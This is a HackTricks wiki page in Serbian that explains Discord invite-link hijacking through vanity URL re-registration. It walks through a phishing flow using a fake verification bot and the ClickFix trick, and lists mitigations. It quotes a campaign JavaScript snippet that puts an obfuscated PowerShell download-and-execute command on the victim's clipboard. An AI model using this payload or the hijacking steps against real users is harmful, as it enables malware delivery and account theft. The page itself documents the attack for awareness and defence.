# Hijacking Discord pozivnica

{{#include ../../banners/hacktricks-training.md}}

Hijacking Discord pozivnica zloupotrebljava pravila ponovne upotrebe custom vanity linkova: istekli kod privremene pozivnice ili obrisani trajni kod sastavljen samo od malih slova i cifara može biti registrovan kao vanity link na serveru sa Level 3 Boost-om. Custom vanity link takođe može postati dostupan kada njegov prvobitni server izgubi Level 3 Boost; za privremenu pozivnicu sa velikim slovima, napadač može unapred registrovati oblik vanity linka sa malim slovima dok obična pozivnica ostaje aktivna, ali preusmeravanje počinje tek nakon isteka te pozivnice.<sup>[[1]](#references)[[2]](#references)</sup>

## Tipovi pozivnica i rizik od hijacking-a

Uočeni rizik razlikuje se u zavisnosti od tipa pozivnice:<sup>[[1]](#references)[[2]](#references)</sup>

| Tip pozivnice           | Može li biti hijacked? | Uslov / napomene                                                                                       |
|-------------------------|------------------------|----------------------------------------------------------------------------------------------------------|
| Privremeni invite link  | ✅                     | Nakon isteka, kod postaje dostupan i boosted server može ponovo da ga registruje kao vanity URL.        |
| Trajni invite link      | ⚠️                     | Ako je obrisan i sastoji se samo od malih slova i cifara, kod može ponovo postati dostupan.               |
| Custom Vanity Link      | ✅                     | Ako prvobitni server izgubi Level 3 Boost, njegov vanity invite postaje dostupan za novu registraciju.   |

## Koraci eksploatacije

1. Prikupljanje informacija
- Pratite javne izvore (forume, društvene mreže, Telegram kanale) u potrazi za invite linkovima koji odgovaraju obrascu `discord.gg/{code}` ili `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Prikupite zanimljive invite kodove (privremene ili vanity).<sup>[[1]](#references)</sup>
2. Pre-registration
- Kreirajte ili koristite postojeći Discord server sa Level 3 Boost privilegijama.<sup>[[1]](#references)[[2]](#references)</sup>
- U **Server Settings → Vanity URL** pokušajte da dodelite ciljani invite kod. Ako bude prihvaćen, kod je rezervisan na zlonamernom serveru.<sup>[[1]](#references)</sup>
3. Aktivacija hijacking-a
- Za privremene pozivnice sačekajte da prvobitna pozivnica istekne (ili je ručno obrišite ako kontrolišete izvor).<sup>[[1]](#references)</sup>
- Kod kodova koji sadrže velika slova, varijanta sa malim slovima može biti preuzeta odmah, iako se preusmeravanje aktivira tek nakon isteka.<sup>[[1]](#references)</sup>
4. Tiho preusmeravanje
- Korisnici koji posete stari link biće neprimetno preusmereni na server pod kontrolom napadača kada hijacking postane aktivan.<sup>[[1]](#references)</sup>

## Phishing tok preko Discord servera

1. Ograničite kanale servera tako da bude vidljiv samo kanal **#verify**.<sup>[[1]](#references)</sup>
2. Postavite bot (npr. **Safeguard#0786**) koji će od novih članova tražiti verifikaciju putem OAuth2.<sup>[[1]](#references)</sup>
3. Bot preusmerava korisnike na phishing sajt (npr. `captchaguard.me`) pod izgovorom CAPTCHA-e ili koraka za verifikaciju.<sup>[[1]](#references)</sup>
4. Implementirajte **ClickFix** UX trik:<sup>[[1]](#references)</sup>
- Prikažite poruku o neispravnoj CAPTCHA-i.
- Uputite korisnike da otvore dijalog **Win+R**, nalepе unapred pripremljenu PowerShell komandu i pritisnu Enter.

### Primer ClickFix Clipboard Injection-a

Campaign je koristio JavaScript za kopiranje zlonamerne PowerShell komande u clipboard:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Ovaj pristup izbegava direktna preuzimanja datoteka i koristi poznate elemente korisničkog interfejsa kako bi smanjio sumnju korisnika.<sup>[[1]](#references)</sup>

## Mitigacije

- Dajte prednost trajnim invite linkovima i uverite se da kod sadrži najmanje jedno veliko slovo; obrisani trajni kodovi koji sadrže velika slova ne mogu ponovo da se koriste kao vanity linkovi.<sup>[[1]](#references)</sup>
- Redovno menjajte invite kodove i opozivajte stare linkove.
- Pratite status boostovanja Discord servera i preuzimanje vanity URL-ova.<sup>[[1]](#references)[[2]](#references)</sup>
- Edukujte korisnike da provere autentičnost servera i izbegavaju izvršavanje komandi nalepljenih iz clipboard-a.

## References

- [1] [Od poverenja do pretnje: Hijacked Discord invite linkovi korišćeni za višestepenu isporuku malware-a](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord podrška](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
